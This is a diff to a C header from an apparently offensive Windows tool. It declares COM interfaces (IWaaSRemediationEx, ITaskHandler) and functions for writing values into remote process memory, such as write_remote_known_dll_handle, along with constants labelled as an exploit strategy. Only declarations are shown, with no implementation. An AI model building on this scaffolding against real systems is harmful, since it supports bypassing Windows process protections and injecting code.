@@ -13,6 +13,10 @@
 #define IID_TASKHANDLER         { 0x839d7762, 0x5121, 0x4009, { 0x92, 0x34, 0x4f, 0x0d, 0x19, 0x39, 0x4f, 0x04 } } // ITaskHandler - 839D7762-5121-4009-9234-4F0D19394F04
 #define IID_ALL_ZERO            { 0x0, 0x0, 0x0, { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 } }
 
+#define EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0 0
+#define EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1 1
+#define EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_2 2
+
 typedef HRESULT(WINAPI* CoCancelCall_t)(DWORD dwThreadId, ULONG ulTimeout);
 typedef HRESULT(WINAPI* CoInitializeEx_t)(LPVOID pvReserved, DWORD dwCoInit);
 typedef HRESULT(WINAPI* CoCreateInstance_t)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
@@ -94,20 +98,39 @@ typedef struct _IWaaSRemediationExVtbl {
         ULONGLONG varResults);
 }IWaaSRemediationExVtbl, *PIWaaSRemediationExVtbl;
 
+typedef struct _ITaskHandlerVtbl {
+    /*** IUnknown methods ***/
+    HRESULT (STDMETHODCALLTYPE *QueryInterface)(
+        IDispatch *This,
+        REFIID riid,
+        void **ppvObject);
+
+    ULONG (STDMETHODCALLTYPE *AddRef)(
+        IDispatch *This);
+
+    ULONG (STDMETHODCALLTYPE *Release)(
+        IDispatch *This);
+
+    /*** ITaskHandler methods ***/
+    HRESULT (STDMETHODCALLTYPE *Start)(
+        IUnknown *This,
+        IUnknown* pHandlerServices,
+        BSTR data);
+
+    HRESULT (STDMETHODCALLTYPE *Stop)(
+        IUnknown *This,
+        HRESULT* pRetCode);
+
+    HRESULT (STDMETHODCALLTYPE *Pause)(
+        IUnknown *This);
+
+    HRESULT (STDMETHODCALLTYPE *Resume)(
+        IUnknown *This);
+}ITaskHandlerVtbl, *PITaskHandlerVtbl;
+
 typedef struct _IWaaSRemediationEx {
     IWaaSRemediationExVtbl* lpVtbl;
 } IWaaSRemediationEx, *PIWaaSRemediationEx;
-
-typedef struct _ITaskHandlerVtbl {
-   QueryInterfacePtr *QueryInterface;
-   AddRefPtr         *AddRef;
-   ReleasePtr        *Release;
-   InvokePtr         *Invoke;
-   StartPtr          *Start;
-   StopPtr           *Stop;
-   PausePtr          *Pause;
-   ResumePtr         *Resume;
-} ITaskHandlerVtbl, *PITaskHandlerVtbl;
 
 typedef struct _ITaskHandler {
     ITaskHandlerVtbl* lpVtbl;
@@ -167,6 +190,9 @@ typedef struct _WRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM
 #define IWaaSRemediationEx_GetIDsOfNames(This,riid,rgszNames,cNames,lcid,rgDispId) \
     ( ((PIWaaSRemediationEx)This)->lpVtbl -> GetIDsOfNames((IDispatch *)This,riid,rgszNames,cNames,lcid,rgDispId) ) 
 
+#define ITaskHandler_Release(This) \
+    ( ((PITaskHandler)This)->lpVtbl -> Release((IDispatch *)This) )
+
 BOOL initialize_interface(
     PIWaaSRemediationEx* IWaaSRemediationExPtr);
 
@@ -186,5 +212,16 @@ BOOL resolve_dispatch_ids(
 
 BOOL calculate_write_addresses(
     IN PVOID BaseAddress,
+    IN ULONG32 TargetValue,
     OUT PDWORD64 WriteAtLaunchDetectionOnly,
     OUT PDWORD64 WriteAtLaunchRemediationOnly);
+
+BOOL write_remote_known_dll_handle(
+    IN PIWaaSRemediationEx IWaaSRemediationEx,
+    IN LONG TargetValue,
+    IN DISPID DispIdLaunchDetectionOnly,
+    IN DISPID DispIdLaunchRemediationOnly,
+    IN DWORD64 WriteAtLaunchDetectionOnly,
+    IN DWORD64 WriteAtLaunchRemediationOnly);
+
+BOOL create_task_handler_instance();
